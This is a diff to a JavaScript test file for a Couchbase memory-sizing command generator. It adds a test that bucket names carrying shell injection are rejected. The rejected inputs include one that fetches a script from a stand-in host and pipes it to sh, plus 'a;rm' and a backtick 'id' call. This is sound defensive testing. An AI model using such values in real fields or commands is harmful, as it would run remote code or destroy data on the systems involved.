@@ -17,6 +17,7 @@ test('golden: exact commands for a known input', () => {
   assert.equal(
     result.snippet.code,
     [
+      '# Raising quotas: run these in order. Lowering them: run the bucket-edit lines first, since Couchbase refuses a Data quota below the bucket quotas already set.',
       'couchbase-cli setting-cluster -c localhost:8091 -u Administrator -p "$CB_PASSWORD" \\',
       '  --cluster-ramsize 278 \\',
       '  --cluster-index-ramsize 512',
@@ -27,6 +28,15 @@ test('golden: exact commands for a known input', () => {
     result.alternative.code,
     'curl -u Administrator:"$CB_PASSWORD" -X POST http://localhost:8091/pools/default \\\n  -d memoryQuota=278 \\\n  -d indexMemoryQuota=512'
   );
+});
+
+test('a bucket name outside Couchbase’s rule is rejected, so nothing unquoted reaches the shell commands', () => {
+  for (const name of ['x$(curl -s evil.example/p|sh)', 'my bucket', 'a;rm', 'b`id`', 'q"x', 'x'.repeat(101)]) {
+    assert.throws(() => sizing({ buckets: [bucketWith({ name })] }), { name: 'RangeError', message: /may only use letters, digits/ }, name);
+  }
+  for (const name of ['travel-sample', 'orders_2026', 'a.b', 'pct%20', 'x'.repeat(100)]) {
+    assert.doesNotThrow(() => sizing({ buckets: [bucketWith({ name })] }), name);
+  }
 });
 
 test('bucket quota is the documented formula spread over the Data nodes, rounded up to a whole MiB per node', () => {
